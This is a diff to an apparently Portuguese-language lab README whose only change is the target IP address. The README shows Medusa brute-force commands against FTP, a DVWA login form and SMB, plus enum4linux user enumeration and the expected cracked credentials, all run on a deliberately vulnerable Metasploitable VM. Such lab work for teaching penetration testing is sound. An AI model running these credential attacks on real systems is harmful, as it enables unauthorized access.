@@ -33,7 +33,7 @@ Este projeto demonstra a implementação, execução e documentação de testes 
 Verifique a comunicação entre as VMs:
 
 ```bash
-ping 192.168.56.101   # IP da Metasploitable
+ping 192.168.56.102   # IP da Metasploitable
 ```
 
 ---
@@ -55,13 +55,13 @@ echo "password" >> wordlist.txt
 ### Ataque com Medusa:
 
 ```bash
-medusa -h 192.168.56.101 -u msfadmin -P wordlist.txt -M ftp
+medusa -h 192.168.56.102 -u msfadmin -P wordlist.txt -M ftp
 ```
 
 ### Resultado esperado:
 
 ```
-ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin
+ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin
 ```
 
 ---
@@ -89,7 +89,7 @@ echo "admin" >> pass.txt
 ### Ataque:
 
 ```bash
-medusa -h 192.168.56.101 -u admin -P pass.txt -M http \
+medusa -h 192.168.56.102 -u admin -P pass.txt -M http \
 -m FORM:"/dvwa/login.php":"username=^USER^&password=^PASS^&Login=Login":"Login failed"
 ```
 
@@ -100,7 +100,7 @@ medusa -h 192.168.56.101 -u admin -P pass.txt -M http \
 ### Enumeração de usuários:
 
 ```bash
-enum4linux -U 192.168.56.101 | grep "user:"
+enum4linux -U 192.168.56.102 | grep "user:"
 ```
 
 ### Wordlists:
@@ -113,7 +113,7 @@ echo "password" > onepass.txt
 ### Ataque:
 
 ```bash
-medusa -h 192.168.56.101 -U users.txt -p password -M smbnt
+medusa -h 192.168.56.102 -U users.txt -p password -M smbnt
 ```
 
 ---
@@ -123,7 +123,7 @@ medusa -h 192.168.56.101 -U users.txt -p password -M smbnt
 ### FTP:
 
 ```bash
-ftp 192.168.56.101
+ftp 192.168.56.102
 ```
 
 ### DVWA:
@@ -133,7 +133,7 @@ Login via interface web.
 ### SMB:
 
 ```bash
-smbclient -L 192.168.56.101 -U msfadmin
+smbclient -L 192.168.56.102 -U msfadmin
 ```
 
 ---
